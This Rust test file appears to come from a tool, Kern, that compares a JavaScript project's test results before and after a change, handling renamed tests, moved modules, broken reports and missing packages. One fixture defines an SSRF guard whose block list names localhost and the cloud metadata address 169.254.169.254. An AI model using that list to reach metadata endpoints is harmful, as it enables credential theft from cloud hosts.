    assert_eq!(c["new_failing"], json!(["app/new.test.ts"]), "a test file the change adds that does not run is still listed: {c}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &c, &off()), None);
    assert!(!md.contains("still pass"), "{md}");
}

#[test]
fn a_suite_too_big_for_the_time_limit_runs_only_the_tests_related_to_the_change() {
    let files: std::collections::BTreeSet<String> = ["packages/web/src/cart.ts".to_string(), "packages/web/src/total.ts".to_string()].into();
    let tests = |runner: policy::Runner, command: &[&str]| policy::Tests { paths: Vec::new(), kind: policy::Kind::Feature, runner, command: command.iter().map(|s| s.to_string()).collect(), edits: policy::Edits::Checked };
    let jest = suite::related(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js"]), &files, "packages/web").unwrap();
    assert_eq!(jest.command, ["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js", "--findRelatedTests", "/workspace/packages/web/src/cart.ts", "/workspace/packages/web/src/total.ts"]);
    let vitest = suite::related(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--project", "unit"]), &files, "packages/web").unwrap();
    assert_eq!(vitest.command, ["/workspace/node_modules/.bin/vitest", "related", "src/cart.ts", "src/total.ts", "--run", "--project", "unit"]);
    assert!(suite::related(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "tests/unit"]), &files, "packages/web").is_none(), "a script that already filters files is not narrowed");
    assert!(suite::related(&tests(policy::Runner::Mocha, &["/workspace/node_modules/.bin/mocha"]), &files, "").is_none());
    assert!(suite::related(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest"]), &std::collections::BTreeSet::new(), "").is_none(), "no changed code, nothing related");
    let focus = suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--project", "unit"]), &files, "packages/web");
    assert!(focus.is_some(), "an option's value is not a file filter");
}

#[test]
fn farm_cases_a_replaced_test_is_gone_and_tests_of_a_file_that_did_not_load_before_are_not_new() {
    let file = "packages/backend/src/verify.test.ts";
    let before = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies provided OAuth token"), 1, 0, 0)], &[]);
    let after = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies opaque OAuth token with aud=undefined"), 1, 0, 0)], &[file]);
    let again = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies opaque OAuth token with aud=undefined"), 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&again));
    assert_eq!(c["broke"], json!([]), "clerk#9585 replaced the test with an it.each; its file also reported an error, but its tests loaded: {c}");
    assert_eq!(c["gone"], json!([format!("{file} > verifies provided OAuth token")]), "{c}");
    let before = report(&[("core/a.test.js > works", 1, 0, 0)], &["core/members.test.js"]);
    let after = report(&[("core/a.test.js > works", 1, 0, 0), ("core/members.test.js > lists", 0, 1, 0), ("core/members.test.js > adds", 0, 1, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!((c["new_failing"].clone(), c["added"].clone()), (json!([]), json!([])), "Ghost#28552: a file that could not load on the old run has no baseline, so its tests are not new: {c}");
}

#[test]
fn a_report_whose_test_titles_cut_an_emoji_in_half_is_still_read() {
    let title = format!("{}\\ud83d ...", "\u{1f600}".repeat(3));
    let jest = format!(r#"{{"numTotalTests":2,"testResults":[{{"name":"/workspace/test/a.test.js","status":"passed","message":"","assertionResults":[{{"ancestorTitles":["emoji"],"title":"{title}","status":"passed"}},{{"ancestorTitles":["emoji"],"title":"keeps \ud83d\ude00 pairs and \\ud83d text","status":"passed"}}]}}]}}"#);
    let r = kern::proof::read_report(policy::Runner::Jest, jest.as_bytes()).unwrap_or_else(|e| panic!("a test title that a runner cut inside an emoji makes the whole report unreadable: {e}"));
    let keys: Vec<&String> = r.tests.keys().collect();
    assert_eq!(keys.len(), 2, "{keys:?}");
    assert!(keys.iter().any(|k| k.ends_with("\u{1f600}\u{1f600}\u{1f600}\u{fffd} ...")) && keys.iter().any(|k| k.ends_with("keeps \u{1f600} pairs and \\ud83d text")), "{keys:?}");
}

#[test]
fn a_change_to_tests_and_docs_alone_puts_nothing_back_and_raises_no_test_data_look() {
    let t = Temp::new();
    let test = "import { total } from '../src/total.js';\nimport { items } from './helpers.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total(items())).toBe(3));\n";
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\n"), ("test/helpers.js", "export const items = () => [1, 2];\n"), ("test/total.test.js", test), ("README.md", "# shop\n")]);
    let head = commit(&r, &[("test/helpers.js", "export const items = () => [1, 2];\nexport const none = () => [];\n"), ("test/total.test.js", &format!("{test}test('adds none', () => expect(total([])).toBe(0));\n")),
        ("README.md", "# shop\n\nAdds things.\n")]);
    let old = report(&[("test/total.test.js > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    assert!(keep.run.is_empty() && keep.data.is_empty() && keep.skipped.is_empty(),
        "the change adds a test, a helper and a line to the README; no code changes, so the old tests on the new code are the old tests on the old code, which passed: nothing to put back and nothing to look at: run {:?} data {:?}", keep.run, keep.data);
}

#[test]
fn the_old_copy_of_a_test_follows_moved_modules_and_reads_its_old_data() {
    let t = Temp::new();
    let test = "import { total } from '../src/total';\nimport { sum } from '../src/sum.js';\nimport { lib } from '../src/lib';\nimport { readFileSync } from 'node:fs';\nimport { test, expect } from 'vitest';\nconst cases = JSON.parse(readFileSync(new URL('./fixtures/cases.json', import.meta.url), 'utf8'));\nconst note = './not a path';\nconst gone = '../src/nowhere.js';\ntest('adds', () => expect(total([2, 3]) + sum([]) + lib + cases.length).toBe(6));\n";
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.ts", "export const total = (xs: number[]) => xs.reduce((a, b) => a + b, 0);\n"), ("src/sum.ts", "export const sum = (xs: number[]) => xs.length;\n"),
        ("src/lib/index.ts", "export const lib = 1;\n"), ("test/fixtures/cases.json", "[1]\n"), ("test/total.test.ts", test)]);
    git(&r, &["mv", "src/total.ts", "src/add.ts"]);
    git(&r, &["mv", "src/sum.ts", "src/count.ts"]);
    git(&r, &["mv", "src/lib", "src/core"]);
    let head = commit(&r, &[("test/total.test.ts", &test.replace("../src/total'", "../src/add'").replace("../src/sum.js", "../src/count.js").replace("../src/lib'", "../src/core'")),
        ("test/fixtures/cases.json", "[1, 2]\n"), ("src/add.ts", "export const total = (xs: number[]) => xs.reduce((a, b) => a + b, 1);\n")]);
    let old = report(&[("test/total.test.ts > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    let copy = "test/total.kern-kept.test.ts";
    let new_text = keep.files.get(copy).unwrap_or_else(|| panic!("the edited test is put back: {:?}", keep.files.keys()));
    for (what, want) in [("an import without its extension follows the rename", "'../src/add'"), ("a .js import of a TypeScript file keeps its .js", "'../src/count.js'"),
        ("a folder import follows the folder", "'../src/core'"), ("the test reads its old data", "'./fixtures/cases.kern-kept.json'"),
        ("a string that is no path stays", "'./not a path'"), ("a path to nothing stays", "'../src/nowhere.js'")] {
        assert!(new_text.contains(want), "{what}: {want} in\n{new_text}");
    }
    assert_eq!(keep.files.get("test/fixtures/cases.kern-kept.json").map(String::as_str), Some("[1]\n"), "the old data is put back beside the new");
    let old_text = &keep.old_files[copy];
    assert!(old_text.contains("'../src/total'") && old_text.contains("'../src/sum.js'") && old_text.contains("'./fixtures/cases.kern-kept.json'"), "on the old code the copy keeps the old paths:\n{old_text}");
    assert!(keep.data.is_empty(), "the data file is checked through the old test, so it needs no look: {:?}", keep.data);
}

#[test]
fn a_test_renamed_in_an_edited_file_whose_old_version_still_passes_is_not_gone() {
    let t = Temp::new();
    let test = |title: &str| format!("import {{ blocked }} from '../src/ssrf.js';\nimport {{ it, expect }} from 'vitest';\nit.each(['localhost', '169.254.169.254'])('{title}', (h) => expect(blocked(h)).toBe(true));\n");
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/ssrf.js", "export const blocked = (h) => ['localhost', '169.254.169.254'].includes(h);\n"), ("test/ssrf.test.js", &test("blocks cloud metadata endpoint %s"))]);
    let head = commit(&r, &[("src/ssrf.js", "export const blocked = (h) => ['localhost', '127.0.0.1', '169.254.169.254'].includes(h);\n"), ("test/ssrf.test.js", &test("blocks %s"))]);
    let old_keys = ["test/ssrf.test.js > blocks cloud metadata endpoint localhost", "test/ssrf.test.js > blocks cloud metadata endpoint 169.254.169.254"];
    let old = report(&old_keys.iter().map(|k| (*k, 1, 0, 0)).collect::<Vec<_>>(), &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    let copy = keep.run.iter().next().expect("the edited test file is put back").clone();
    let mut ran = Report::default();
    for k in old_keys { ran.tests.insert(k.replace("test/ssrf.test.js", &copy), Count { passed: 1, failed: 0, skipped: 0 }); }
    let outcome = suite::kept_outcome(&old, &keep, Ok(suite::unkept(&ran, &keep.back)), None);
    assert_eq!(outcome.held.iter().collect::<std::collections::BTreeSet<_>>(), old_keys.iter().map(|k| k.to_string()).collect::<Vec<_>>().iter().collect(),
        "the change renames the tests' title template; their old versions still pass on the new code, so what they checked still holds and they are not gone");
    assert!(outcome.rewritten.is_empty() && outcome.unchecked.is_empty());
}

#[test]
fn changed_data_that_only_tests_kern_does_not_run_use_needs_no_look() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\n"), ("test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([1, 2])).toBe(3));\n"),
        ("e2e/fixtures/worker.js", "export default { fetch: () => new Response('ok') };\n"), ("test/fixtures/load.js", "export const load = (name) => import(`./${name}.js`);\n")]);
    let head = commit(&r, &[("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 1);\n"), ("e2e/fixtures/worker.js", "export default { fetch: () => new Response('ko') };\n"),
        ("test/fixtures/load.js", "export const load = (name) => import(`./${name}.mjs`);\n")]);
    let old = report(&[("test/total.test.js > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    assert_eq!(keep.data, ["test/fixtures/load.js"],
        "e2e/ holds only end-to-end tests Kern does not run, so a changed file there cannot hide a break in the tests it runs; test/fixtures/ sits beside the tests that ran, and no old test names it, so it needs a look");
}

#[test]
fn a_new_test_that_fails_the_way_old_tests_already_fail_here_is_set_aside() {
    let knex = "Error: Knex: run\n$ npm install sqlite3 --save\nCannot find module 'bindings'\nRequire stack:\n- /workspace/node_modules/.pnpm/sqlite3@5.1.7/lib/binding.js";
    let report = |rows: &[(&str, &str, Option<&str>)]| -> Value {
        let results: Vec<Value> = rows.iter().map(|(file, title, error)| json!({ "name": format!("/workspace/{file}"), "status": if error.is_some() { "failed" } else { "passed" },
            "assertionResults": [{ "ancestorTitles": [], "title": title, "status": if error.is_some() { "failed" } else { "passed" }, "failureMessages": error.map(|e| vec![e.to_string()]).unwrap_or_default() }] })).collect();
        json!({ "numTotalTests": rows.len(), "testResults": results })
    };
    let read = |v: Value| kern::proof::read_report(policy::Runner::Vitest, v.to_string().as_bytes()).unwrap();
    let before = read(report(&[("test/old-db.test.js", "reads a post", Some(knex)), ("test/math.test.js", "adds", None)]));
    let after = read(report(&[("test/old-db.test.js", "reads a post", Some(knex)), ("test/math.test.js", "adds", None),
        ("test/price.test.js", "formats a price", Some(&knex.replace("5.1.7", "5.1.8"))), ("test/total.test.js", "totals", Some("AssertionError: expected 6 to be 5"))]));
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!(c["same_failure"], json!(["test/price.test.js > formats a price"]), "a new test that fails the way old tests already fail here (sqlite's native part is missing) is the sandbox, not the change: {c}");
    assert_eq!(c["new_failing"], json!(["test/total.test.js > totals"]), "a new test that fails some other way still needs a look: {c}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &json!({ "changed": [] }), &c, &off()), None);
    assert!(md.contains("1 new fail here the same way tests already failing on the old code do"), "{md}");
}

#[test]
fn many_items_in_one_test_file_are_one_line() {
    let names: Vec<String> = (1..=5).map(|i| format!("test/price.test.js > formats case {i}")).collect();
    let mut tests = suite::compare(&report(&[("test/a.test.js > adds", 1, 0, 0)], &[]), &report(&[("test/a.test.js > adds", 1, 0, 0)], &[]), None);
    tests["new_failing"] = json!(names.iter().chain(["test/other.test.js > one".to_string()].iter()).collect::<Vec<_>>());
    let r = receipt::build(&drive_json(), &json!({ "changed": [] }), &tests, &off());
    let what: Vec<&str> = r["look"].as_array().unwrap().iter().filter(|x| x["kind"] == "new-test-fails").map(|x| x["what"].as_str().unwrap()).collect();
    assert_eq!(what.len(), 2, "five failing tests in one file are one item, the one in another file its own: {what:#?}");
    assert!(what[0].starts_with("5 tests this change adds fail on the new code in `test/price.test.js`") && what[0].ends_with(", …"), "{what:#?}");
}

#[test]
fn the_package_a_test_cannot_load_is_read_from_the_runners_own_error() {
    let errors = [
        "src/config/lightdashConfig.mock.ts:1:55 - error TS2307: Cannot find module '@lightdash/common' or its corresponding type declarations.",
        "Cannot find module 'gatsby-worker' from '.jestSetup.js'",
        "Failed to load url @midscene/shared/env (resolved id: @midscene/shared/env) in /workspace/packages/android/tests/unit-test/agent.test.ts. Does the file exist?",
        "Error: Failed to resolve entry for package \"@mono/lib\". The package may have incorrect main/module/exports specified in its package.json.",
        "Cannot find module './version' from 'components/version/index.tsx'",
        "Cannot find module 'node:fs/promises'",
        "Error: Cannot find module '/workspace/node_modules/@acme/core/dist/index.js'",
    ];
    let found = suite::missing_packages(&errors.join("\n"));
    assert_eq!(found.into_iter().collect::<Vec<_>>(), ["@acme/core", "@lightdash/common", "@midscene/shared", "@mono/lib", "gatsby-worker"], "relative files and node's own modules are not packages");
}

#[test]
fn the_packages_a_test_needs_are_built_after_the_ones_they_need() {
    let pkg = |name: &str, deps: &[&str], build: bool| -> Value {
        let mut v = json!({ "name": name, "dependencies": deps.iter().map(|d| (d.to_string(), json!("workspace:*"))).collect::<serde_json::Map<String, Value>>() });
        if build { v["scripts"] = json!({ "build": "tsc -b" }); }
        v
    };
    let mut ws = suite::Workspace::new();
    ws.insert("@acme/app".into(), ("packages/app".into(), pkg("@acme/app", &["@acme/ui", "react"], true)));
    ws.insert("@acme/ui".into(), ("packages/ui".into(), pkg("@acme/ui", &["@acme/core"], true)));
    ws.insert("@acme/core".into(), ("packages/core".into(), pkg("@acme/core", &[], true)));
    ws.insert("@acme/types".into(), ("packages/types".into(), pkg("@acme/types", &[], false)));
    let steps = suite::repair_steps(&ws, &["@acme/ui".to_string(), "@acme/types".to_string()].into_iter().collect(), Some(""));
    assert_eq!(steps, [("packages/core".to_string(), "build".to_string()), ("packages/ui".to_string(), "build".to_string()), (String::new(), "pretest".to_string())],
        "ui needs core built first; app is not needed; types has nothing to build; the root's pretest runs last, as npm test would run it");
}

#[test]
fn the_build_steps_reach_the_sandbox_under_a_name_it_accepts() {
    let src = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/src/suite.rs")).unwrap();
    let name = src.split("process.env.").nth(1).and_then(|s| s.split(')').next()).unwrap_or("");
    assert!(kern::script::env_name(name), "the test run refuses variable {name:?}, so the build step would never run (KERN_ names are Kern's own)");
}

#[test]
fn a_runner_that_crashes_is_quoted_by_its_first_error_not_only_its_last_lines() {
    let err = b"failed to load config from /workspace/apps/web/vite.config.ts

Startup Error
Error: Failed to load native binding
    at Object.<anonymous> (/workspace/node_modules/@swc/core/binding.js:345:11)
  [cause]: [
  ]
}
";
    let why = suite::no_results("the output contains no vitest report", b"exit 1", err, b"");
    assert!(why.contains("its first error: failed to load config from /workspace/apps/web/vite.config.ts") && why.contains("the last lines it printed"), "{why}");
}

#[test]
fn a_platform_part_npm_left_out_is_found_and_only_the_one_for_this_machine() {
    let t = Temp::new();
    let nm = t.0.join("node_modules");
    let arch = if cfg!(target_arch = "aarch64") { "arm64" } else { "x64" };
    std::fs::create_dir_all(nm.join("@rollup/rollup")).unwrap();
    std::fs::write(nm.join("@rollup/rollup/package.json"), json!({ "name": "@rollup/rollup", "optionalDependencies": {
        format!("@rollup/rollup-linux-{arch}-gnu"): "4.20.0", format!("@rollup/rollup-linux-{arch}-musl"): "4.20.0", "@rollup/rollup-darwin-arm64": "4.20.0", "@rollup/rollup-win32-x64-msvc": "4.20.0" } }).to_string()).unwrap();
    std::fs::create_dir_all(nm.join("esbuild")).unwrap();
    std::fs::write(nm.join("esbuild/package.json"), json!({ "name": "esbuild", "optionalDependencies": { format!("@esbuild/linux-{arch}"): "0.23.0" } }).to_string()).unwrap();
    std::fs::create_dir_all(nm.join(format!("@esbuild/linux-{arch}"))).unwrap();
    let parts = kern::sandbox::missing_platform_parts(&nm);
    assert_eq!(parts, [(format!("@rollup/rollup-linux-{arch}-gnu"), "4.20.0".to_string())],
        "npm's lockfile from a Mac leaves out rollup's Linux part (npm/cli#4828), so vitest cannot start; esbuild's is already there, and musl, macOS and Windows parts are not this machine's");
}
